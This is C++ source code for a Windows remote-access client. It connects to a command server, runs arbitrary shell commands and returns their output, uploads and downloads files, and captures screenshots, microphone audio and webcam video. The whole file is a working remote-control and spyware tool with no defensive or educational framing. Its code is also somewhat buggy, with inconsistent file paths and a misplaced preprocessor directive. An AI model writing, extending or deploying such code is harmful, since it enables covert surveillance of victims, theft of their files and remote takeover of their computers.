#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <fstream>
#include <vector>
#include <windows.h>
#include <GdiPlus.h>
#include <opencv2\opencv.hpp>
#include <opencv2\core\core.hpp>
#include <opencv2\highgui\highgui.hpp>
#include <SFML/Graphics.hpp>
#include <SFML/Audio.hpp>
#include <ctime>
#include <memory>
#include <thread>
#include <filesystem>


#pragma warning(disable:4996)

#pragma comment(lib, "ws2_32.lib")

#pragma comment( lib, "gdiplus" )



using namespace std;
using namespace cv;
using namespace std::experimental::filesystem::v1;

class Client {

#ifdef _WIN32



	string ip;
	int port;
public:
	Client(string ip , int port)
	{
		this->ip = ip;
		this->port = port;
	}

	

	void gdiscreen(const wchar_t* avi)
	{
		using namespace Gdiplus;
		GdiplusStartupInput gdiplusStartupInput;
		ULONG_PTR gdiplusToken;
		GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

		{
			HDC scrdc, memdc;
			HBITMAP membit;
			scrdc = ::GetDC(0);
			int Height = GetSystemMetrics(SM_CYSCREEN);
			int Width = GetSystemMetrics(SM_CXSCREEN);
			memdc = CreateCompatibleDC(scrdc);
			membit = CreateCompatibleBitmap(scrdc, Width, Height);
			HBITMAP hOldBitmap = (HBITMAP)SelectObject(memdc, membit);
			BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
			Gdiplus::Bitmap bitmap(membit, NULL);
			CLSID clsid;
			GetEncoderClsid(L"image/jpeg", &clsid);
			//        bitmap.Save((IStream *) path, &clsid);
			bitmap.Save(avi, &clsid);
			SelectObject(memdc, hOldBitmap);
			DeleteObject(memdc);
			DeleteObject(membit);
			::ReleaseDC(0, scrdc);
		}
		GdiplusShutdown(gdiplusToken);
	}

	int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
	{
		using namespace Gdiplus;
		UINT num = 0; // number of image encoders
		UINT size = 0; // size of the image encoder array in bytes
		ImageCodecInfo* pImageCodecInfo = NULL;
		GetImageEncodersSize(&num, &size);
		if (size == 0)
			return -1; // Failure
		pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
		if (pImageCodecInfo == NULL)
			return -1; // Failure
		GetImageEncoders(num, size, pImageCodecInfo);
		for (UINT j = 0; j < num; ++j)
		{
			if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
			{
				*pClsid = pImageCodecInfo[j].Clsid;
				free(pImageCodecInfo);
				return j; // Success
			}
		}
		free(pImageCodecInfo);
		return 0;
	}


	void executeCommands(string commands)
	{
		char ch;
		FILE* fpipe;
		FILE* copy_fp;
		char* command = (char*)commands.c_str();
		copy_fp = fopen("C:\\C projects\\output_file_path.txt", "w");
		fpipe = (FILE*)_popen(command, "r");
		if (fpipe)
		{
			while ((ch = static_cast<char>(fgetc(fpipe))) != EOF)
			{
				fputc(ch, copy_fp);
			}
		}
		else
		{
			if (copy_fp)
			{
				fprintf(copy_fp, "Sorry there was an error opening the file");
			}
		}
		_pclose(fpipe);
		fclose(copy_fp);
		return;
#endif
	}


	void send_file_to_server(SOCKET socket, string fileName)
	{
		const int BUFFER_SIZE = 1024;
		//unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BUFFER_SIZE + 1, 0);
		vector<char> buffer(BUFFER_SIZE + 1, 0);
		ifstream file(fileName, ifstream::binary);
		while (true)
		{
			file.read(buffer.data(), BUFFER_SIZE);
			send(socket, buffer.data(), static_cast<int>(file.gcount()), 0);
			if (!file)
				break;
		}
		file.close();
	}


	void receive_file_from_server(SOCKET socket, string path)
	{
		ofstream file{ path, ofstream::binary };
		vector<char> buffer(1025, 0);
		int size;
		while (true)
		{
			size = recv(socket, buffer.data(), 1024, 0);


			if (!buffer.data() || size < 1024)
			{
				file.write(buffer.data(), size);
				file.flush();
				file.close();
				break;
			}
			file.write(buffer.data(), size);
		}
	}

	int cameraCapturing(int seconds, SOCKET socket)
	{
		VideoCapture cap(0); // open the video camera no. 0

		VideoWriter writer;

		VideoWriter();

		if (!cap.isOpened()) // if not success, exit program
		{
			cout << "ERROR INITIALIZING VIDEO CAPTURE" << endl;
			return -1;
		}

		string windowName = "";
		namedWindow(windowName, WINDOW_AUTOSIZE); //create a window to display our webcam feed

		//File name string
		string filename = "C:\\C projects\\test.mp4";

		//fourcc integer
		int fcc = VideoWriter::fourcc('M', 'P', '4', '2');

		//frames per sec intefer
		int fps = 60;

		//frame size
		Size frameSize(cap.get(CAP_PROP_FRAME_WIDTH), cap.get(CAP_PROP_FRAME_HEIGHT));

		writer = VideoWriter(filename, fcc, fps, frameSize);

		time_t currentTime = time(NULL);
		cout << currentTime << endl;
		while (time(NULL) != currentTime + seconds + 3)
		{
			Mat frame;
			bool bSuccess = cap.read(frame); // read a new frame from camera feed

			if (!bSuccess) //test if frame successfully read
			{
				cout << "ERROR READING FRAME FROM CAMERA FEED" << endl;
				break;
			}
			writer.write(frame);
			//send(socket, sizeof(reinterpret_cast<const char*>(frame.data), to_string(frame.data));
			string size = string(frame.begin<unsigned char>(), frame.end<unsigned char>());
			//string size = (frame.begin<unsigned char>() , frame.end<unsigned char>());
			send(socket, to_string(size.size()).c_str(), sizeof(to_string(size.size()).c_str()), 0);
			send(socket, size.c_str(), size.size(), 0);
			imshow(windowName, frame); //show the frame in "MyVideo" window
		}
		cout << time(NULL) << endl;
		destroyAllWindows();
	}


	int capturingAudio(int seconds)
	{
		if (!sf::SoundBufferRecorder::isAvailable)
			return -1;

		sf::SoundBufferRecorder recorder;
		time_t currentTime = time(NULL);
		recorder.start();
		while (time(NULL) != currentTime + seconds + 1)
		{
		}
		recorder.stop();
		const sf::SoundBuffer& buffer = recorder.getBuffer();
		buffer.saveToFile("C:\\C projects\\mic output.ogg");
		return 1;
	}


	void client()
	{
		string ipAdress = this->ip; //IP Address of the server
		int port = this->port; //Listtening port # on server


		// Initialize Winsock

		WSADATA data;
		WORD ver = MAKEWORD(2, 2);
		int wsResualt = WSAStartup(ver, &data);

		if (wsResualt != 0)
		{
			cerr << "Cant start Winsock";
			return;
		}

		// Create socket
		SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);

		if (sock == INVALID_SOCKET)
		{
			cerr << "Cant create socket" << WSAGetLastError << endl;
			WSACleanup();
			return;
		}
		// Fill in a hint structure
		sockaddr_in hint;
		hint.sin_family = AF_INET;
		hint.sin_port = htons(static_cast<u_short>(port));
		inet_pton(AF_INET, ipAdress.c_str(), &hint.sin_addr);

		// Connect to serverT
		int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
		if (connResult == SOCKET_ERROR)
		{
			cerr << "Cant connect to server" << WSAGetLastError << endl;
			closesocket(sock);
			WSACleanup();
			return;
		}

		//Do-while loop to send and receive data
		char buf[1024];
		string userInput;

		while (true)
		{
			cout << "hey2" << endl;
			ZeroMemory(buf, 1024);
			int bytesRecived = recv(sock, buf, 1024, 0);
			string command = string(buf, 0, static_cast<const unsigned int>(bytesRecived));

			if (command.find("cmd ") == 0)
			{
				try
				{
					command = command.substr(4, command.size() - 1);
					executeCommands(command);
					send_file_to_server(sock, "C:\\C projects\\output_file_path.txt");
				}
				catch (exception)
				{
					string error = "Error with " + command + " command";
					send(sock, error.c_str(), error.size() + 1, 0);
				}
			}
			else if (command.find("get file ") == 0)
			{
				command = command.substr(9, command.size() - 1);
				send_file_to_server(sock, command);
			}
			else if (command.find("download file ") == 0)
			{
				bytesRecived = recv(sock, buf, 1024, 0);
				string path = string(buf, 0, static_cast<const unsigned int>(bytesRecived));
				receive_file_from_server(sock, path);
			}
			else if (command.find("take screenshot ") == 0)
			{
				command = command.substr(16, command.size() - 1);
				wstring path = wstring(command.begin(), command.end());
				const wchar_t* szName = path.c_str();
				gdiscreen(szName);
				send_file_to_server(sock, command);
			}
			else if (command.find("take mic output") == 0)
			{
				command = command.substr(16, command.size() - 1);
				capturingAudio(stoi(command));
				send_file_to_server(sock, "C:\\C project\\mic output.ogg");
			}


			else if (command.find("take camera video") == 0)
			{
				command = command.substr(18, command.size() - 1);
				cameraCapturing(stoi(command), sock);
				send_file_to_server(sock, "C:\\C projects\\test.mp4");
			}

			else
			{
				string problem{ "Cant find the command " + command };
				send(sock, problem.c_str(), problem.size() + 1, 0);
			}
		}

		// Gracefully close down everything
		closesocket(sock);
		WSACleanup();
	}
};

int main()
{
	auto client = new Client("127.0.0.1" , 9999);
	client->client();
}
